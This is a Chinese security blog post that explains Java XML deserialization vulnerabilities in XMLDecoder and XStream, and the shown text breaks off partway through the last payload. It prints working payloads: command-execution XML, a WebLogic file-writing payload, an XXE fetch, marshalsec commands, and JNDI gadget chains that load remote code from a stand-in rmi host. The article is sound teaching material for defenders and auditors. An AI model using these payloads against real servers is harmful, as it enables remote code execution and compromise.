@@ -1,0 +1,619 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Java 反序列化漏洞始末（5）— XML/YAML - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="哔哔两句前面把反序列化漏洞里的一大巨头“JSON”的主要问题给总结了一下，XML 和 YAML 在反序列化漏洞中也能算得上是个很常见的问题。我例举出几个几个 XML 和 YAML 的反序列化漏洞..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Java 反序列化漏洞始末（5）— XML/YAML &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/239.html" />
+<link rel="alternate" type="application/rdf+xml" title="Java 反序列化漏洞始末（5）— XML/YAML &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/239.html" />
+<link rel="alternate" type="application/atom+xml" title="Java 反序列化漏洞始末（5）— XML/YAML &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/239.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-239'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-239'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-239'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _51C8 = 'c'//'c'
++'fNZ'//'fNZ'
++//'tv'
+'cb'+'f84'//'A'
++''///*'5Jq'*/'5Jq'
++//'t'
+'31'+//'cK'
+'8'+'a5c'//'kPQ'
++//'R'
+'6'+'66'//'Nh'
++//'dBg'
+'4aa'+''///*'jxz'*/'jxz'
++'3'//'q'
++//'7L'
+'2fb'+'5'//'H3A'
++'ee'//'sz'
++'0'//'Dl4'
++//'L'
+'4'+'n'//'n'
++/* 'uTI'//'uTI' */''+'3q'//'3q'
++'20'//'Y3'
++'0'//'m'
++//'fz'
+'a'+''///*'YG'*/'YG'
++//'gB'
+'b1', _azh4 = [[0,1],[0,3],[26,27],[26,28]];
+    
+    for (var i = 0; i < _azh4.length; i ++) {
+        _51C8 = _51C8.substring(0, _azh4[i][0]) + _51C8.substring(_azh4[i][1]);
+    }
+
+    return _51C8;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Java 反序列化漏洞始末（5）— XML/YAML</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-11-15 21:04:00" itemprop="datePublished">2019-11-15 21:04:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/239.html"><a href="https://b1ue.cn/category/vul/">漏洞</a>,<a href="https://b1ue.cn/category/safe/">安全</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/239.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>哔哔两句</h1><p>前面把反序列化漏洞里的一大巨头“JSON”的主要问题给总结了一下，XML 和 YAML 在反序列化漏洞中也能算得上是个很常见的问题。</p><p>我例举出几个几个 XML 和 YAML 的反序列化漏洞。</p><ol><li>XMLDecoder</li><li>XStream</li><li>SnakeYaml</li></ol><p>在我遇到的项目里，这三个依赖库最常见。</p><p>其中 XMLDecoder 不同于其他几个，这个更像是反射漏洞，虽然本质上都是可以反序列化回序列化的数据，但 XMLDecoder 和 XStream 可以自由的控制类、方法、参数，SnakeYaml 一类就同 Jackson 和 fastjson 一样，本质上是调用了 get、set 和构造方法。</p><p>下面我对这3个类库的漏洞做一个演示和分析</p><h1>XMLDecoder</h1><p>在 Weblogic 前几次曝光的漏洞中，就是 XMLDecoder 导致的。XMLDecoder 是 JDK 的一个对象转XML的工具。</p><p>我先写上两段简单的demo。</p><p><strong>Encode</strong></p><pre><code>import java.beans.XMLEncoder;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.HashMap;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1f7d736a7a5f76676c7a7c31706d78">[email&#160;protected]</a>
+ * @since 2019/4/24 12:09
+ */
+public class Test {
+
+    public static void main(String[] args) throws IOException, InterruptedException {
+
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;123&quot;,&quot;aaaa&quot;);
+        map.put(&quot;321&quot;,new ArrayList&lt;&gt;());
+
+        XMLEncoder xmlEncoder = new XMLEncoder(System.out);
+        xmlEncoder.writeObject(map);
+        xmlEncoder.close();
+
+    }
+}</code></pre><p><img src="/usr/uploads/2019/10/2708674397.jpg" alt="1572007030(1).jpg" title="1572007030(1).jpg"></p><p>这是一段用 XMLEncoder 生成 hashmap 对象 xml 的代码。</p><pre><code>&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+ &lt;object class=&quot;java.util.HashMap&quot;&gt;
+  &lt;void method=&quot;put&quot;&gt;
+   &lt;string&gt;123&lt;/string&gt;
+   &lt;string&gt;aaaa&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void method=&quot;put&quot;&gt;
+   &lt;string&gt;321&lt;/string&gt;
+   &lt;object class=&quot;java.util.ArrayList&quot;/&gt;
+  &lt;/void&gt;
+ &lt;/object&gt;
+&lt;/java&gt;</code></pre><p>再拿这个生成的xml，用XMLDecoder解析</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dbb9b7aebe9bb2a3a8beb8f5b4a9bc">[email&#160;protected]</a>
+ * @since 2019/4/24 12:09
+ */
+public class Test {
+
+    public static void main(String[] args) throws IOException, InterruptedException {
+        String s = &quot;&lt;java version=\&quot;1.8.0_131\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +
+                &quot; &lt;object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot; +
+                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
+                &quot;   &lt;string&gt;123&lt;/string&gt;\n&quot; +
+                &quot;   &lt;string&gt;aaaa&lt;/string&gt;\n&quot; +
+                &quot;  &lt;/void&gt;\n&quot; +
+                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
+                &quot;   &lt;string&gt;321&lt;/string&gt;\n&quot; +
+                &quot;   &lt;object class=\&quot;java.util.ArrayList\&quot;/&gt;\n&quot; +
+                &quot;  &lt;/void&gt;\n&quot; +
+                &quot; &lt;/object&gt;\n&quot; +
+                &quot;&lt;/java&gt;&quot;;
+        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
+        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
+        Object o = xmlDecoder.readObject();
+        System.out.println(o);
+
+    }
+}</code></pre><p>输出的结果是</p><pre><code>{123=aaaa, 321=[]}</code></pre><p>成功把刚才的map对象给反序列化回来了。</p><p>自己看一下生成出来的 xml 稍微懂点代码的都能看得出来，标签里指定了类名，方法名，参数等信息。</p><p>所以可以完全可以通过修改他们来去执行代码了。</p><pre><code>&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+ &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
+  &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;
+    &lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;
+  &lt;/array&gt;
+  &lt;void method=&quot;start&quot;&gt;&lt;/void&gt;
+ &lt;/object&gt;
+&lt;/java&gt;</code></pre><p>比如这就是一个执行 calc 命令的 payload。</p><p>看代码里的 object 标签，class 的值就是要被实例化的全类名</p><p>array 标签里就是 ProcessBuilder 对象的构造参数</p><p>然后 void 标签指定了 method 参数为 start </p><p>这些加起来，相当于执行了</p><pre><code>new java.lang.ProcessBuilder(new String[]{&quot;calc&quot;}).start();</code></pre><p>现在再看 weblogic XMLDecoder 的一些 payload 就很容易看懂了</p><p>比如</p><pre><code>&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+&lt;object class=&quot;java.io.PrintWriter&quot;&gt;
+&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp&lt;/string&gt;
+&lt;void method=&quot;println&quot;&gt;
+&lt;string&gt;&lt;![CDATA[ blue ]]&gt;&lt;/string&gt;
+&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
+&lt;/object&gt;
+&lt;/java&gt;</code></pre><p>转成代码实际上就是</p><pre><code>    java.io.PrintWriter x = new java.io.PrintWriter(&quot;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp&quot;);
+    x.println(&quot;blue&quot;);
+    x.close();
+</code></pre><h1>XStream</h1><p>XStream 和 XMLDecoder 差不多，都是 Java 对象和 XML 互转的库，在审计java项目时也经常能见到。</p><p>比较出名的几个项目 Bamboo 、 Struts2 、Jenkins 都有用到它，且曝出过漏洞。</p><p>XStream 有几个 CVE ，分别是 RCE、XXE、DOS，由于主题是反序列化，所以不过多介绍 XXE 和 DOS。</p><p><strong>XXE</strong><br>影响 1.4.8 及之前版本。</p><pre><code>com.thoughtworks.xstream.io.xml.DomDriver domDriver = new com.thoughtworks.xstream.io.xml.DomDriver();
+String x = &quot;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;\n&quot; +
+           &quot;&lt;!ENTITY  % xxe SYSTEM \&quot;http://127.0.0.1:2333/evil.dtd\&quot; &gt;\n&quot; +
+           &quot;%xxe;]&gt;\n&quot; +
+           &quot;&lt;foo&gt;1&lt;/foo&gt;&quot;;
+domDriver.createReader(new StringReader(x));</code></pre><p>漏洞参考 <a href="http://x-stream.github.io/CVE-2016-3674.html" target="_blank">http://x-stream.github.io/CVE-2016-3674.html</a></p><p><strong>DOS</strong><br>影响 1.4.9 及之前版本</p><pre><code>XStream xstream = new XStream();
+xstream.fromXML(&quot;&lt;void/&gt;&quot;);
+xstream.fromXML(&quot;&lt;string class='void'&gt;Hello, world!&lt;/string&gt;&quot;);</code></pre><p><strong>RCE</strong></p><p>它的 CVE 编号是 CVE-2013-7285，可以影响到 1.4.10 版本。</p><p>最近还有一个新的 CVE 编号 CVE-2019-10173，给出的 payload 和 CVE-2013-7285 没啥区别。</p><p>应该是 1.4.10 版本更新的时候加了一个通过 XStream.setupDefaultSecurity 方法 初始化安全框架的功能。</p><p>但默认不被调用，依然可以攻击 1.4.10 版本的 XStream。</p><pre><code>    XStream xstream = new XStream();
+    String x = &quot;&lt;sorted-set&gt;\n&quot; +
+            &quot;    &lt;dynamic-proxy&gt;\n&quot; +
+            &quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +
+            &quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot; +
+            &quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +
+            &quot;                &lt;command&gt;\n&quot; +
+            &quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot; +
+            &quot;                &lt;/command&gt;\n&quot; +
+            &quot;            &lt;/target&gt;\n&quot; +
+            &quot;            &lt;action&gt;start&lt;/action&gt;\n&quot; +
+            &quot;        &lt;/handler&gt;\n&quot; +
+            &quot;    &lt;/dynamic-proxy&gt;\n&quot; +
+            &quot;&lt;/sorted-set&gt;&quot;;
+
+    xstream.fromXML(x);
+</code></pre><p>使用 1.4.10 版本解析这个 POC，就会执行 calc 命令。</p><p>其实 java unmarshal 反序列化利用工具“marshalsec” 里就可以生成 XStream 的很多 gadgets。</p><p><img src="/usr/uploads/2019/11/680914261.jpg" alt="1573743180(1).jpg" title="1573743180(1).jpg"></p><pre><code>CommonsConfiguration, Rome, CommonsBeanutils, ServiceLoader, ImageIO,
+BindingEnumeration, LazySearchEnumeration, SpringAbstractBeanFactoryPointcutAdvisor, SpringPartiallyComparableAdvisorHolder, Resin, XBe
+an </code></pre><p>实现的这些接口都是可以生成的 gadgets。</p><p>其中一般项目中比较常见的有 SpringAbstractBeanFactoryPointcutAdvisor、CommonsBeanutils、ImageIO、SpringPartiallyComparableAdvisorHolder</p><p><strong>ImageIO</strong></p><blockquote><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc</p></blockquote><pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                      &lt;command&gt;
+                        &lt;string&gt;calc&lt;/string&gt;
+                      &lt;/command&gt;
+                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                    &lt;/next&gt;
+                  &lt;/iter&gt;
+                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                      &lt;name&gt;start&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                    &lt;name&gt;foo&lt;/name&gt;
+                  &lt;/filter&gt;
+                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;</code></pre><p>用 1.4.10 版本的 XStream 解析这段 POC 就会执行 calc 命令，因为POC加载的类有包含“javax.crypto.”包名，被列入了 XStream 的黑名单，所以无法在 &gt; 1.4.10 版本中触发。</p><p><strong>CommonsBeanutils</strong></p><blockquote><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils rmi://127.0.0.1:2333/exp</p></blockquote><pre><code>&lt;java.util.PriorityQueue serialization=&quot;custom&quot;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+      &lt;comparator class=&quot;org.apache.commons.beanutils.BeanComparator&quot;&gt;
+        &lt;property&gt;databaseMetaData&lt;/property&gt;
+        &lt;comparator class=&quot;java.util.Collections$ReverseComparator&quot;/&gt;
+      &lt;/comparator&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;com.sun.rowset.JdbcRowSetImpl serialization=&quot;custom&quot;&gt;
+      &lt;javax.sql.rowset.BaseRowSet&gt;
+        &lt;default&gt;
+          &lt;concurrency&gt;1008&lt;/concurrency&gt;
+          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
+          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
+          &lt;fetchSize&gt;0&lt;/fetchSize&gt;
+          &lt;isolation&gt;2&lt;/isolation&gt;
+          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
+          &lt;maxRows&gt;0&lt;/maxRows&gt;
+          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
+          &lt;readOnly&gt;true&lt;/readOnly&gt;
+          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
+          &lt;showDeleted&gt;false&lt;/showDeleted&gt;
+          &lt;dataSource&gt;rmi://127.0.0.1:2333/exp&lt;/dataSource&gt;
+          &lt;params/&gt;
+        &lt;/default&gt;
+      &lt;/javax.sql.rowset.BaseRowSet&gt;
+      &lt;com.sun.rowset.JdbcRowSetImpl&gt;
+        &lt;default&gt;
+          &lt;iMatchColumns&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+            &lt;int&gt;-1&lt;/int&gt;
+          &lt;/iMatchColumns&gt;
+          &lt;strMatchColumns&gt;
+            &lt;string&gt;foo&lt;/string&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+            &lt;null/&gt;
+          &lt;/strMatchColumns&gt;
+        &lt;/default&gt;
+      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
+    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
+    &lt;com.sun.rowset.JdbcRowSetImpl reference=&quot;../com.sun.rowset.JdbcRowSetImpl&quot;/&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;</code></pre><p>CommonsBeanutils 的这个 gadgets 利用的是 JNDI，并且没有类在黑名单里，所以可以打全版本，用最新的 1.4.11.1 都可以，只要没用 <code>XStream.setupDefaultSecurity</code>。</p><p><strong>SpringPartiallyComparableAdvisorHolder</strong></p><blockquote><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream SpringPartiallyComparableAdvisorHolder rmi://127.0.0.1:2333/exp</p></blockquote><pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;org.springframework.aop.target.HotSwappableTargetSource&gt;
+      &lt;target class=&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;&gt;
+        &lt;advisor class=&quot;org.springframework.aop.aspectj.AspectJPointcutAdvisor&quot;&gt;
+          &lt;advice class=&quot;org.springframework.aop.aspectj.AspectJAroundAdvice&quot; serialization=&quot;custom&quot;&gt;
+            &lt;org.springframework.aop.aspectj.AbstractAspectJAdvice&gt;
+              &lt;default&gt;
+                &lt;argumentsIntrospected&gt;false&lt;/argumentsIntrospected&gt;
+                &lt;declarationOrder&gt;0&lt;/declarationOrder&gt;
+                &lt;joinPointArgumentIndex&gt;0&lt;/joinPointArgumentIndex&gt;
+                &lt;joinPointStaticPartArgumentIndex&gt;0&lt;/joinPointStaticPartArgumentIndex&gt;
+                &lt;aspectInstanceFactory class=&quot;org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory&quot;&gt;
+                  &lt;beanFactory class=&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;&gt;
+                    &lt;logger class=&quot;org.apache.commons.logging.impl.NoOpLog&quot;/&gt;
+                    &lt;jndiTemplate&gt;
+                      &lt;logger class=&quot;org.apache.commons.logging.impl.NoOpLog&quot;/&gt;
+                    &lt;/jndiTemplate&gt;
+                    &lt;resourceRef&gt;true&lt;/resourceRef&gt;
+                    &lt;shareableResources&gt;
+                      &lt;string&gt;rmi://127.0.0.1:2333/exp&lt;/string&gt;
+                    &lt;/shareableResources&gt;
+                    &lt;singletonObjects/&gt;
+                    &lt;resourceTypes/&gt;
+                  &lt;/beanFactory&gt;
+                  &lt;name&gt;rmi://127.0.0.1:2333/exp&lt;/name&gt;
+                &lt;/aspectInstanceFactory&gt;
+                &lt;declaringClass&gt;java.lang.Object&lt;/declaringClass&gt;
+                &lt;methodName&gt;toString&lt;/methodName&gt;
+                &lt;parameterTypes/&gt;
+              &lt;/default&gt;
+            &lt;/org.springframework.aop.aspectj.AbstractAspectJAdvice&gt;
+          &lt;/advice&gt;
+        &lt;/advisor&gt;
+      &lt;/target&gt;
+    &lt;/org.springframework.aop.target.HotSwappableTargetSource&gt;
+    &lt;org.springframework.aop.target.HotSwappableTargetSource reference=&quot;../org.springframework.aop.target.HotSwappableTargetSource&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;org.springframework.aop.target.HotSwappableTargetSource&gt;
+      &lt;target class=&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;&gt;
+        &lt;m__obj class=&quot;string&quot;&gt;疵&amp;#x5;&amp;#x8;&amp;#xb;&lt;/m__obj&gt;
+      &lt;/target&gt;
+    &lt;/org.springframework.aop.target.HotSwappableTargetSource&gt;
+    &lt;org.springframework.aop.target.HotSwappableTargetSource reference=&quot;../org.springframework.aop.target.HotSwappableTargetSource&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;</code></pre><p>SpringPartiallyComparableAdvisorHolder 利用 JNDI 执行代码，需要 spring aop 依赖，可影响到 1.4.11 最新版本。</p><p><strong>SpringAbstractBeanFactoryPointcutAdvisor</strong></p><blockquote><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream SpringAbstractBeanFactoryPointcutAdvisor rmi://127.0.0.1:2333/exp</p></blockquote><pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=&quot;custom&quot;&gt;
+      &lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;
+        &lt;default&gt;
+          &lt;adviceBeanName&gt;rmi://127.0.0.1:2333/exp&lt;/adviceBeanName&gt;
+          &lt;beanFactory class=&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;&gt;
+            &lt;logger class=&quot;org.apache.commons.logging.impl.NoOpLog&quot;/&gt;
+            &lt;jndiTemplate&gt;
+              &lt;logger class=&quot;org.apache.commons.logging.impl.NoOpLog&quot;/&gt;
+            &lt;/jndiTemplate&gt;
+            &lt;resourceRef&gt;true&lt;/resourceRef&gt;
+            &lt;shareableResources&gt;
+              &lt;string&gt;rmi://127.0.0.1:2333/exp&lt;/string&gt;
+            &lt;/shareableResources&gt;
+            &lt;singletonObjects/&gt;
+            &lt;resourceTypes/&gt;
+          &lt;/beanFactory&gt;
+        &lt;/default&gt;
+      &lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;
+      &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+        &lt;default&gt;
+          &lt;pointcut class=&quot;org.springframework.aop.TruePointcut&quot;/&gt;
+        &lt;/default&gt;
+      &lt;/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+    &lt;/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+    &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=&quot;../org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
